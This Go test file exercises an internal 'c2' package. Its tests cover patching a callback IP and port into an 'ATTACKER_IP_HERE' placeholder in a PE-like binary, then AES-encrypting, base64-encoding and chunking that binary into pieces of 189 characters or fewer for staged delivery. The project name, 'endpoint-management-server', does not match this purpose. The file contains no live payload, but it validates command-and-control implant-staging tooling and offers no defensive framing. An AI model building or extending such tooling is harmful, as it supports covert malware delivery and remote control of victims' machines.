package tests

import (
	"bytes"
	"crypto/aes"
	"crypto/rand"
	"encoding/base64"
	"encoding/hex"
	"strings"
	"testing"

	"endpoint-management-server/internal/c2"
)

// ─── helpers ────────────────────────────────────────────────────────────────

func randomAESKey(t *testing.T) []byte {
	t.Helper()
	key := make([]byte, 32)
	if _, err := rand.Read(key); err != nil {
		t.Fatalf("rand.Read: %v", err)
	}
	return key
}

// buildPayloadWithPlaceholder builds a fake PE-like blob that contains the
// expected 64-byte placeholder at a known offset.
func buildPayloadWithPlaceholder() []byte {
	prefix := bytes.Repeat([]byte{0xAA}, 128)
	placeholder := make([]byte, 64)
	copy(placeholder, []byte("ATTACKER_IP_HERE"))
	portSlot := make([]byte, 2)   // will be written by PatchIPInPayload
	suffix := bytes.Repeat([]byte{0xBB}, 128)
	return append(append(append(prefix, placeholder...), portSlot...), suffix...)
}

// ─── ChunkPayload ────────────────────────────────────────────────────────────

func TestChunkPayload_SplitsCorrectly(t *testing.T) {
	data := []byte(strings.Repeat("X", 500))
	chunks := c2.ChunkPayload(data, 189)

	// ceil(500/189) = 3
	if len(chunks) != 3 {
		t.Fatalf("expected 3 chunks, got %d", len(chunks))
	}
	if len(chunks[0]) != 189 {
		t.Errorf("chunk[0] len: want 189, got %d", len(chunks[0]))
	}
	if len(chunks[1]) != 189 {
		t.Errorf("chunk[1] len: want 189, got %d", len(chunks[1]))
	}
	// last chunk = 500 - 378 = 122
	if len(chunks[2]) != 122 {
		t.Errorf("chunk[2] len: want 122, got %d", len(chunks[2]))
	}
}

func TestChunkPayload_ReassemblyIsLossless(t *testing.T) {
	original := make([]byte, 1000)
	if _, err := rand.Read(original); err != nil {
		t.Fatal(err)
	}
	chunks := c2.ChunkPayload(original, 189)

	var recombined []byte
	for _, ch := range chunks {
		recombined = append(recombined, []byte(ch)...)
	}
	if !bytes.Equal(original, recombined) {
		t.Error("reassembled data differs from original")
	}
}

func TestChunkPayload_SingleChunkWhenSmall(t *testing.T) {
	data := []byte("hello")
	chunks := c2.ChunkPayload(data, 189)
	if len(chunks) != 1 {
		t.Fatalf("expected 1 chunk, got %d", len(chunks))
	}
	if chunks[0] != "hello" {
		t.Errorf("chunk content mismatch: %q", chunks[0])
	}
}

func TestChunkPayload_EmptyInput(t *testing.T) {
	chunks := c2.ChunkPayload([]byte{}, 189)
	if len(chunks) != 0 {
		t.Errorf("expected 0 chunks for empty input, got %d", len(chunks))
	}
}

func TestChunkPayload_ExactChunkSize(t *testing.T) {
	data := bytes.Repeat([]byte("A"), 189)
	chunks := c2.ChunkPayload(data, 189)
	if len(chunks) != 1 {
		t.Fatalf("expected 1 chunk, got %d", len(chunks))
	}
}

// ─── PatchIPInPayload ────────────────────────────────────────────────────────

func TestPatchIPInPayload_PatchesIPAndPort(t *testing.T) {
	payload := buildPayloadWithPlaceholder()
	patched, err := c2.PatchIPInPayload(payload, "10.0.0.1", 4444)
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	// Locate placeholder region (offset 128).
	ip := strings.TrimRight(string(patched[128:192]), "\x00")
	if ip != "10.0.0.1" {
		t.Errorf("IP mismatch: want %q, got %q", "10.0.0.1", ip)
	}
	// Port at offset 192 as little-endian uint16.
	lo, hi := patched[192], patched[193]
	port := uint16(lo) | uint16(hi)<<8
	if port != 4444 {
		t.Errorf("port mismatch: want 4444, got %d", port)
	}
}

func TestPatchIPInPayload_DoesNotModifyOriginal(t *testing.T) {
	payload := buildPayloadWithPlaceholder()
	original := make([]byte, len(payload))
	copy(original, payload)

	_, err := c2.PatchIPInPayload(payload, "192.168.1.1", 9999)
	if err != nil {
		t.Fatal(err)
	}
	if !bytes.Equal(payload, original) {
		t.Error("PatchIPInPayload modified the original slice")
	}
}

func TestPatchIPInPayload_NoPlaceholderReturnsError(t *testing.T) {
	payload := bytes.Repeat([]byte{0x00}, 256)
	_, err := c2.PatchIPInPayload(payload, "1.2.3.4", 80)
	if err == nil {
		t.Error("expected error for payload without placeholder, got nil")
	}
}

func TestPatchIPInPayload_LongIPFitsIn64Bytes(t *testing.T) {
	payload := buildPayloadWithPlaceholder()
	longIP := "255.255.255.255" // 15 chars — must fit in 64-byte field
	_, err := c2.PatchIPInPayload(payload, longIP, 65535)
	if err != nil {
		t.Fatalf("unexpected error for valid long IP: %v", err)
	}
}

// ─── ProcessPayload ──────────────────────────────────────────────────────────

func TestProcessPayload_FullPipeline(t *testing.T) {
	payload := buildPayloadWithPlaceholder()
	key := randomAESKey(t)

	chunks, sha256hex, err := c2.ProcessPayload(payload, key, "10.0.0.1", 4444)
	if err != nil {
		t.Fatalf("ProcessPayload: %v", err)
	}

	if len(chunks) == 0 {
		t.Error("expected at least one chunk")
	}
	if len(sha256hex) != 64 {
		t.Errorf("sha256 hex len: want 64, got %d", len(sha256hex))
	}
	// hex-decode to confirm it parses
	if _, err := hex.DecodeString(sha256hex); err != nil {
		t.Errorf("sha256hex is not valid hex: %v", err)
	}
}

func TestProcessPayload_ChunksAreBase64(t *testing.T) {
	payload := buildPayloadWithPlaceholder()
	key := randomAESKey(t)

	chunks, _, err := c2.ProcessPayload(payload, key, "127.0.0.1", 1234)
	if err != nil {
		t.Fatal(err)
	}

	// Concatenate all chunks and verify the full string is valid base64.
	all := strings.Join(chunks, "")
	if _, err := base64.StdEncoding.DecodeString(all); err != nil {
		t.Errorf("concatenated chunks are not valid base64: %v", err)
	}
}

func TestProcessPayload_ChunkSizeAtMost189(t *testing.T) {
	payload := buildPayloadWithPlaceholder()
	key := randomAESKey(t)

	chunks, _, err := c2.ProcessPayload(payload, key, "10.0.0.1", 80)
	if err != nil {
		t.Fatal(err)
	}
	for i, ch := range chunks {
		if len(ch) > 189 {
			t.Errorf("chunk[%d] length %d exceeds 189", i, len(ch))
		}
	}
}

func TestProcessPayload_DifferentPayloadsProduceDifferentHashes(t *testing.T) {
	key := randomAESKey(t)
	p1 := buildPayloadWithPlaceholder()
	p2 := buildPayloadWithPlaceholder()
	p2[0] ^= 0xFF // flip one byte

	_, h1, err := c2.ProcessPayload(p1, key, "1.1.1.1", 80)
	if err != nil {
		t.Fatal(err)
	}
	_, h2, err := c2.ProcessPayload(p2, key, "1.1.1.1", 80)
	if err != nil {
		t.Fatal(err)
	}
	if h1 == h2 {
		t.Error("different payloads produced identical sha256 hashes")
	}
}

func TestProcessPayload_BadAESKeyReturnsError(t *testing.T) {
	payload := buildPayloadWithPlaceholder()
	badKey := make([]byte, 7) // AES needs 16/24/32 bytes
	_, _, err := c2.ProcessPayload(payload, badKey, "1.2.3.4", 80)
	if err == nil {
		t.Error("expected error for bad AES key length, got nil")
	}
	_ = aes.NewCipher // ensure aes imported (compile check)
}
